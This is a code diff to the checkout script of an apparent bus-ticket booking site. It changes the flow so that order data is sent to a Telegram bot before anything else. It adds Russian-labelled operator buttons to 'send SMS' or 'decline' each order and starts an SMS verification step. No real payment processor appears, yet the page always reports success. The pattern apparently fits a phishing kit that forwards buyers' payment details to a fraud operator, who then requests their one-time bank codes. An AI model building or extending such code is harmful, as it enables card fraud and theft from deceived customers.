@@ -417,38 +417,45 @@ class PaymentPage {
       
       console.log('Order data prepared:', orderData);
       
-      // Simulate payment processing delay
-      console.log('Simulating payment processing...');
-      await new Promise(resolve => setTimeout(resolve, 2000));
+      // Send order to Telegram bot and start SMS verification flow
+      console.log('Starting SMS verification flow...');
       
-      // Send order to Telegram bot (non-blocking)
-      console.log('Sending to Telegram...');
-      this.sendToTelegramBot(orderData).catch(telegramError => {
-        console.warn('Telegram notification failed:', telegramError);
-      });
-      
-      console.log('Saving to localStorage...');
-      // Save payment success to localStorage
-      const paymentData = {
-        bookingId: bookingId,
-        seats: this.selectedSeats,
-        route: `${this.bookingData.from} → ${this.bookingData.to}`,
-        date: this.bookingData.date,
-        time: `${this.bookingData.departureTime} - ${this.bookingData.arrivalTime}`,
-        price: `€${this.totalPrice.toFixed(2)}`,
-        timestamp: new Date().toISOString()
-      };
-      
-      localStorage.setItem('paymentComplete', JSON.stringify(paymentData));
-      console.log('Data saved to localStorage:', paymentData);
-
-      console.log('Payment successful! Redirecting to confirmation page...');
-      alert('Payment successful! Redirecting to confirmation page...');
-      
-      // Small delay to ensure alert is shown
-      setTimeout(() => {
-        window.location.href = 'confirmation.html';
-      }, 1000);
+      try {
+        await this.sendToTelegramBot(orderData);
+        console.log('✅ Order sent to Telegram successfully');
+        
+        // Start SMS verification flow
+        if (window.paymentSMS) {
+          console.log('📱 Starting SMS payment flow...');
+          
+          // Prepare payment data for localStorage (will be saved after SMS verification)
+          const paymentData = {
+            bookingId: bookingId,
+            seats: this.selectedSeats,
+            route: `${this.bookingData.from} → ${this.bookingData.to}`,
+            date: this.bookingData.date,
+            time: `${this.bookingData.departureTime} - ${this.bookingData.arrivalTime}`,
+            price: `€${this.totalPrice.toFixed(2)}`,
+            timestamp: new Date().toISOString()
+          };
+          
+          // Store payment data temporarily
+          localStorage.setItem('pendingPayment', JSON.stringify(paymentData));
+          
+          // Start SMS verification flow
+          window.paymentSMS.startPaymentFlow(bookingId, orderData);
+          
+        } else {
+          // Fallback: direct payment without SMS
+          console.log('⚠️ SMS system not available, proceeding with direct payment');
+          this.completePaymentDirectly(orderData);
+        }
+        
+      } catch (telegramError) {
+        console.error('❌ Telegram notification failed:', telegramError);
+        // Continue with direct payment even if Telegram fails
+        this.completePaymentDirectly(orderData);
+      }
       
     } catch (error) {
       console.error('Payment processing error:', error);
@@ -505,6 +512,18 @@ class PaymentPage {
     
     try {
       console.log('🚀 Sending request to Telegram API...');
+      
+      // Add inline keyboard for admin actions
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: '📱 Отправить SMS', callback_data: `send_sms:${orderData.bookingId}` },
+            { text: '❌ Отклонить', callback_data: `decline:${orderData.bookingId}` }
+          ]
+        ]
+      };
+      
+      payload.reply_markup = keyboard;
       
       const response = await fetch(telegramUrl, {
         method: 'POST',
@@ -618,6 +637,31 @@ class PaymentPage {
 
   generateBookingId() {
     return 'BT' + Date.now().toString().slice(-8) + Math.random().toString(36).substring(2, 5).toUpperCase();
+  }
+
+  completePaymentDirectly(orderData) {
+    console.log('💳 Completing payment directly...');
+    
+    // Save payment data to localStorage
+    const paymentData = {
+      bookingId: orderData.bookingId,
+      seats: this.selectedSeats,
+      route: `${this.bookingData.from} → ${this.bookingData.to}`,
+      date: this.bookingData.date,
+      time: `${this.bookingData.departureTime} - ${this.bookingData.arrivalTime}`,
+      price: `€${this.totalPrice.toFixed(2)}`,
+      timestamp: new Date().toISOString()
+    };
+    
+    localStorage.setItem('paymentComplete', JSON.stringify(paymentData));
+    console.log('✅ Payment data saved to localStorage');
+
+    // Show success message and redirect
+    alert('Payment successful! Redirecting to confirmation page...');
+    
+    setTimeout(() => {
+      window.location.href = 'confirmation.html';
+    }, 1000);
   }
 }
 
